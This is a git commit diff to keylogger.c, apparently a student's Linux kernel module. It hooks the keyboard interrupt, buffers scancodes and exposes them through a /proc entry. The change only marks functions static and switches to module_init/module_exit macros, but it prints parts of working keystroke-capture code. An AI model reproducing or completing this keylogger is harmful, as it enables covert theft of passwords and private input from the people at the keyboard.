9f9fbfb375821565f936ab5c4bcfdef48bc2c64d
kwshoemaker2 <kwshoemaker@lcmail.lcsc.edu>
2015-11-07 20:41:42 -0900

    made everything static and used fancy init and exit macros and stuff like that kernel module development guide says to do

--- keylogger.c
+++ keylogger.c
@@ -10,21 +10,21 @@
 #define PROC_FILE_NAME "kl"
 #define BUFFER_SIZE 1024
 
-char kl_buffer[BUFFER_SIZE];
-int kl_buffer_offset = 0;
-struct file_operations proc_fops;
+static char kl_buffer[BUFFER_SIZE];
+static int kl_buffer_offset = 0;
+static struct file_operations proc_fops;
 
 /*
  This function services keyboard interrupts.
 */
 
-void reset_buffer(void)
+static void reset_buffer(void)
 {
 	kl_buffer_offset = 0;
 	memset(kl_buffer, 0, BUFFER_SIZE);
 }
 
-irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
+static irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 {
 	static unsigned char scancode;
 	int reslt;
@@ -45,7 +45,7 @@ irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 	return (irq_handler_t) IRQ_HANDLED;
 }
 
-ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) {
+static ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) {
 	int read_size;
 	if(count > BUFFER_SIZE) {
 		read_size = BUFFER_SIZE;
@@ -61,7 +61,7 @@ ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) {
 /*
  Initialize the module - register the IRQ handler
 */
-int init_module(void)
+static int __init init_keylogger(void)
 {
 	int result;
 	proc_fops.read = read_simple;
@@ -75,11 +75,11 @@ int init_module(void)
 	return result;
 }
 
-void cleanup_module(void)
+static void __exit exit_keylogger(void)
 {
 	remove_proc_entry(PROC_FILE_NAME, NULL);
 }
 
-//module_init(init_keylogger);
-//module_exit(exit_keylogger);
-//MODULE_LICENSE ("GPL");
+module_init(init_keylogger);
+module_exit(exit_keylogger);
+MODULE_LICENSE ("GPL");
